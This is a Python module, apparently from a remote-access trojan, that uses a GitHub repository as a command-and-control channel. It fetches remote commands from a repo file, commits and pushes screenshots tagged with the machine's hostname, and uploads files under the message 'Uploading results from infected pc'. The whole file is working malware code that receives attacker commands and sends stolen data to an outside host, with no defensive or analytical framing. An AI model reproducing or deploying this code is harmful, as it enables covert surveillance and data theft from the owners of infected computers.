# Repo Manager: Connection to Github Repo

# Import packages
from modules.filemanager import readFile
from dotenv import load_dotenv
from datetime import datetime
from github import Github
from git import Repo
import platform
import os

# Get all ENV variables
load_dotenv()
GITHUB_TOKEN = os.getenv("TOKEN_GITHUB")
g = Github(GITHUB_TOKEN)
repo = g.get_user().get_repo("pythonproject")
hostname = platform.node()


# Get content from given file in github repository
def readRemoteCommands(file):
    result_file = repo.get_contents(file)
    return result_file.decoded_content


def writeIMGToRepo(file):
    repo = Repo(".")  # if repo is CWD just do '.'

    repo.index.add([file])
    repo.index.commit("Screenshot from " + hostname)
    origin = repo.remote("origin")
    origin.push()
    print(f"{file} aangemaakt op github")


# Write file to repository with given name
def writeToRepo(file):
    # Creating unique name for each result
    content = readFile(file)
    time = datetime.now().strftime("%Y%m%d%H%M%S")

    pad = f"result/{hostname}-{time}-{file}"
    repo.create_file(
        pad,
        f"Uploading results from infected pc: {hostname}",
        content,
        branch="main",
    )
    print(f"{pad} aangemaakt op github")
